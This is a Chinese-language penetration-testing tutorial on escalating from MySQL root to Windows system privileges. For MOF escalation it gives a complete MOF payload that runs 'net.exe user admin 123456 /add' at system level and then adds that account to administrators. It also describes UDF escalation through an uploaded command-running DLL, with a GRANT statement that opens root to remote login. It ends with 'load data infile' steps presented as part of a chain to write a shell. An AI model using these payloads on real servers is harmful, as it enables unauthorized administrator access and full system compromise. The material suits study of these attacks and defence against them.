一、MOF提权

使用范围:（windows） 

Windows Server 2003/XP 等 Windows低版本

需要权限

必须要有导出权限

原理 ：

mof是Windows系统的一个文件，位于C:/windows/system32/wbem/mof/nullevt.mof，叫做托管对象格式， 它的作用是每隔5秒，就会去监控进程的创建和死亡。mof提权的简单利用过程就是，拥有了MySQL的root权限 后，使用root权限去执行上传操作，将我们重新改写过的mof文件上传，之后，这个文件会被服务器每隔5秒 以system权限执行。这个改写的mof中，有一段是vbs脚本，这个vbs大多数是cmd的添加管理员用户的命令。

#pragma namespace("\\\\.\\root\\subscription")instance of __EventFilter as $EventFilter{EventNamespace = "Root\\Cimv2";Name = "filtP2";Query = "Select * From __InstanceModificationEvent ""Where TargetInstance Isa \"Win32_LocalTime\" ""And TargetInstance.Second = 5";QueryLanguage = "WQL";};instance of ActiveScriptEventConsumer as $Consumer{Name = "consPCSV2";ScriptingEngine = "JScript";ScriptText ="var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin 123456 /add\")";};instance of __FilterToConsumerBinding{Consumer = $Consumer;Filter = $EventFilter;};

其中的关键就在于第17的net.exe user admin 123456 /add，这句是用来创建一个用户名为admin，密码为123456的用户。创建成功后，再将这句命令改为“net.exe localgroup administrators admin /add”后，再次上传，达到创建admin用户并将其加入administrators组的目的。

UDF 提权

无版本要求，只和Mysql有关，与服务器版本无关

权限需求

1.必须要有导出权限，且用户必须root权限

2.并且开启远程连接mysql

grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;flush privileges;

原理

UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在

sql语句中调用，就像调用本机函数一样。通过加载dll文件扩展，我们可以让Mysql去做一切事情。通过上传可以调用系统命令的Dll扩展，然后设置好自定义函数，

然后使用函数执行命令。

相当于直接构造了一个函数我们将函数传入到指定文件当中去调用他

实战

如果mysql版本>5.1,udf.dll文件必须放置在mysql安装目录下的lib\plugin\

如果mysql版本小于等于5.1,udf.dll文件在system32目录下

load data infile 写 shell 打组合拳 文件包含 phpmyadmin

格式: load data infile "path" into tablename作用: 将数据从一个文本文件中高速读入到指定的数据库的表中；使用条件：1.mysqld进程服务已经在运行；2.要读取的文件须处于数据库目录或者可以被所有人读取；3.需要有文件的file权限4.如果指定local关键词,表明从客户主机读文件;5.通过sql注入知道执行的表名并且有几个字段6.需要获取绝对路径

使用：

load data infile "绝对路径/sql.txt" into table users;上传资料头像等地方可以获取

sql.txt需要自行创建填写内容，从客户端进行操作时，要在data 后面添加local参数； 

为了避免在导入过程中出现错误，一般使用ignore参数，这样可以跳过有唯一键的现有行的重复行的输入：

load data infile "绝对路径" ignore into table users character set utf8 fields terminated by '\t' lines terminated by '\n';1.character set utf8 是将字符集设置为utf8编码;2.fields terminated by 是每一项数据之间用分隔符间隔;3.lines terminated by 是每一行添加结束符;
